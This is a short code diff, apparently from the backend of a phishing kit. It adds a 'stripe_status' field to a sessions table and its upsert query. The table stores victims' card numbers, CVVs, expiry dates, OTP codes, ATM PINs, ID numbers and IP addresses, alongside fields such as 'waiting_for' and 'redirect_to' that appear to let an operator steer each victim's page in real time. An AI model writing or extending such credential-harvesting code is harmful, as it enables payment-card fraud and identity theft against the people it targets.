@@ -47,6 +47,7 @@ export async function initDB() {
         atm_pin TEXT DEFAULT '',
         current_page TEXT DEFAULT 'home',
         waiting_for TEXT DEFAULT '',
+        stripe_status TEXT DEFAULT '',
         status TEXT DEFAULT 'active',
         is_new INTEGER DEFAULT 1,
         redirect_to TEXT DEFAULT '',
@@ -122,6 +123,7 @@ export async function upsertSession(data: {
   atmPin?: string;
   currentPage?: string;
   waitingFor?: string;
+  stripeStatus?: string;
 }) {
   await initDB();
   const now = Date.now();
@@ -131,8 +133,8 @@ export async function upsertSession(data: {
       INSERT INTO sessions (
         id, country, ip, name, id_number, plate_number, booking_date,
         phone, email, card_number, card_expiry, card_cvv, card_holder,
-        otp_code, atm_pin, current_page, waiting_for, created_at, updated_at
-      ) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$18)
+        otp_code, atm_pin, current_page, waiting_for, stripe_status, created_at, updated_at
+      ) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$19)
       ON CONFLICT (id) DO UPDATE SET
         country = CASE WHEN $2 != '' THEN $2 ELSE sessions.country END,
         ip = CASE WHEN $3 != '' THEN $3 ELSE sessions.ip END,
@@ -150,7 +152,8 @@ export async function upsertSession(data: {
         atm_pin = CASE WHEN $15 != '' THEN $15 ELSE sessions.atm_pin END,
         current_page = CASE WHEN $16 != '' THEN $16 ELSE sessions.current_page END,
         waiting_for = CASE WHEN $17 != '' THEN $17 ELSE sessions.waiting_for END,
-        updated_at = $18,
+        stripe_status = CASE WHEN $18 != '' THEN $18 ELSE sessions.stripe_status END,
+        updated_at = $19,
         is_new = 1
     `, [
       data.id,
@@ -170,6 +173,7 @@ export async function upsertSession(data: {
       data.atmPin || '',
       data.currentPage || '',
       data.waitingFor || '',
+      data.stripeStatus || '',
       now,
     ]);
   } finally {
